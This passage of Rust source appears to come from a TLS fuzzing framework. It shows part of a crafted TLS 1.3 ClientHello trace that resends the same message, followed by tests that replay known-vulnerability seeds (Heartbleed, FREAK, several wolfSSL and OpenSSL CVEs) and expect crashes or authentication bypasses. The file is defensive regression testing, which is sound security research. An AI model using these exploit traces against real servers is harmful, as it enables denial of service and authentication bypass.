                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                // CHANGED from: (fn_client_extensions_append(
                                // CHANGED from:     fn_client_extensions_new,
                                // CHANGED from:     (fn_support_group_extension(fn_named_group_secp384r1))
                                // CHANGED from: )),
                                // ^ lacks of the above makes the server enter a `SERVER_HELLO_RETRY_REQUEST_COMPLETE` state
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        (fn_key_share_deterministic_extension(fn_named_group_secp384r1))
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let trace = Trace {
        // No more need for a prior trace and a full handshake.
        prior_traces: vec![], // WAS [initial_handshake],
        descriptors: vec![AgentDescriptor::new_server(server, TLSVersion::V1_3)],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
        ],
    };

    trace
}

#[cfg(test)]
pub mod tests {
    use nix::{
        sys::{
            signal::Signal,
            wait::{
                waitpid, WaitPidFlag,
                WaitStatus::{Exited, Signaled},
            },
        },
        unistd::{fork, ForkResult},
    };
    use puffin::put::{PutDescriptor, PutOptions};

    use crate::{
        put_registry::{TLS_PUT_REGISTRY, WOLFSSL520_PUT},
        tls::{
            seeds::{seed_session_resumption_dhe_full, seed_successful12_with_tickets},
            trace_helper::{TraceExecutor, TraceHelper},
            vulnerabilities::*,
        },
    };

    fn expect_crash<R>(mut func: R)
    where
        R: FnMut(),
    {
        match unsafe { fork() } {
            Ok(ForkResult::Parent { child, .. }) => {
                let status = waitpid(child, Option::from(WaitPidFlag::empty())).unwrap();

                if let Signaled(_, signal, _) = status {
                    if signal != Signal::SIGSEGV && signal != Signal::SIGABRT {
                        panic!("Trace did not crash with SIGSEGV/SIGABRT!")
                    }
                } else if let Exited(_, code) = status {
                    if code == 0 {
                        panic!("Trace did not crash exit with non-zero code (AddressSanitizer)!")
                    }
                } else {
                    panic!("Trace did not signal!")
                }
            }
            Ok(ForkResult::Child) => {
                func();
                std::process::exit(0);
            }
            Err(_) => panic!("Fork failed"),
        }
    }

    // Vulnerable up until OpenSSL 1.0.1j
    #[cfg(all(feature = "openssl101-binding", feature = "asan"))]
    #[cfg(feature = "tls12")]
    #[test]
    #[ignore] // We can not check for this vulnerability right now
    fn test_seed_freak() {
        expect_crash(|| {
            seed_freak.execute_trace();
        });
    }

    #[cfg(all(feature = "openssl101-binding", feature = "asan"))]
    #[cfg(feature = "tls12")]
    #[test]
    fn test_seed_heartbleed() {
        expect_crash(|| {
            seed_heartbleed.execute_trace();
        })
    }

    #[test]
    #[cfg(feature = "openssl111j")]
    #[cfg(feature = "tls12")]
    fn test_seed_cve_2021_3449() {
        expect_crash(|| {
            seed_cve_2021_3449.execute_trace();
        });
    }

    #[test]
    #[cfg(feature = "wolfssl510")]
    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
    #[cfg(feature = "client-authentication-transcript-extraction")]
    #[should_panic(expected = "Authentication bypass")]
    fn test_seed_cve_2022_25640() {
        let ctx = seed_cve_2022_25640.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[test]
    #[cfg(feature = "wolfssl510")]
    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
    #[cfg(feature = "client-authentication-transcript-extraction")]
    #[should_panic(expected = "Authentication bypass")]
    fn test_seed_cve_2022_25640_simple() {
        let ctx = seed_cve_2022_25640_simple.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[test]
    #[cfg(feature = "wolfssl510")]
    #[cfg(feature = "tls13")] // require version which supports TLS 1.3
    #[cfg(feature = "client-authentication-transcript-extraction")]
    #[should_panic(expected = "Authentication bypass")]
    fn test_seed_cve_2022_25638() {
        let ctx = seed_cve_2022_25638.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[test]
    #[cfg(feature = "tls12")]
    #[ignore] // Disabled because requires: disable("postauth", None) in wolfSSL build.rs
    /// Internal ID was "Finding 1"
    fn test_seed_cve_2022_38152() {
        let put = PutDescriptor {
            name: WOLFSSL520_PUT,
            options: PutOptions::new(vec![("clear", "true")]),
        };

        let trace = seed_session_resumption_dhe_full.build_trace();
        let initial_server = trace.descriptors[0].name;
        let server = trace.prior_traces[0].descriptors[0].name;

        trace.execute_with_puts(
            &TLS_PUT_REGISTRY,
            &[(initial_server, put.clone()), (server, put)],
        );
        expect_crash(|| {});
    }

    #[test]
    #[cfg(feature = "tls12")]
    #[cfg(feature = "tls12-session-resumption")]
    #[ignore] // Disabled because requires wolfSSL 5.3.0
              // Internally known as "Finding 8"
    fn test_seed_cve_2022_38153() {
        for i in 0..50 {
            seed_successful12_with_tickets.execute_trace();
        }

        expect_crash(|| {
            seed_cve_2022_38153.execute_trace();
        });
    }

    #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
    #[test]
    fn test_seed_cve_2022_39173_full() {
        let ctx = seed_cve_2022_39173_full.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
    #[test]
    fn test_seed_cve_2022_39173_complete() {
        let ctx = seed_cve_2022_39173_complete.execute_trace();
        assert!(ctx.agents_successful());
    }

    #[cfg(all(feature = "tls13", feature = "tls13-session-resumption"))]
    #[test]
    fn test_seed_cve_2022_39173_minimized() {
        let ctx = seed_cve_2022_39173_minimized.execute_trace();
        assert!(ctx.agents_successful());
    }

    mod tcp {
        use log::info;
        use puffin::{
            agent::{AgentName, TLSVersion},
            put::PutDescriptor,
        };

        use crate::{
            put_registry::{TCP_PUT, TLS_PUT_REGISTRY},
            tcp::{
                openssl_server,
                tcp_puts::{wolfssl_client, wolfssl_server},
                wolfssl_client, wolfssl_server,
            },
            tls::{
                trace_helper::TraceHelper,
                vulnerabilities::{seed_cve_2022_38153, seed_cve_2022_39173_full},
            },
        };

        #[test]
        #[ignore] // wolfssl example server and client are not available in CI
                  // Internally known as "Finding 8"
        fn test_wolfssl_openssl_test_seed_cve_2022_38153() {
            let port = 44334;

            let server_guard = openssl_server(port, TLSVersion::V1_2);
            let server = PutDescriptor {
                name: TCP_PUT,
                options: server_guard.build_options(),
            };

            let port = 44335;

            let client_guard = wolfssl_client(port, TLSVersion::V1_2, Some(50));
            let client = PutDescriptor {
                name: TCP_PUT,
                options: client_guard.build_options(),
            };

            let trace = seed_cve_2022_38153.build_trace();
            let descriptors = &trace.descriptors;
            let client_name = descriptors[0].name;
            let server_name = descriptors[1].name;
            let mut context = trace.execute_with_puts(
                &TLS_PUT_REGISTRY,
                &[(client_name, client.clone()), (server_name, server.clone())],
            );

            let client = AgentName::first();
            let shutdown = context.find_agent_mut(client).unwrap().put_mut().shutdown();
            info!("{}", shutdown);
            assert!(shutdown.contains("free(): invalid pointer"));
        }

        #[test]
        fn test_wolfssl_cve_2022_39173() {
            let port = 44330;
            let guard = wolfssl_server(port, TLSVersion::V1_3);
            let put = PutDescriptor {
                name: TCP_PUT,
                options: guard.build_options(),
            };

            let trace = seed_cve_2022_39173_full.build_trace();
            let initial_server = trace.prior_traces[0].descriptors[0].name;
            let server = trace.descriptors[0].name;
            let mut context = trace.execute_with_puts(
                &TLS_PUT_REGISTRY,
                &[(initial_server, put.clone()), (server, put)],
            );

            let server = AgentName::first().next();
            let shutdown = context.find_agent_mut(server).unwrap().put_mut().shutdown();
            info!("{}", shutdown);
        }
    }
}
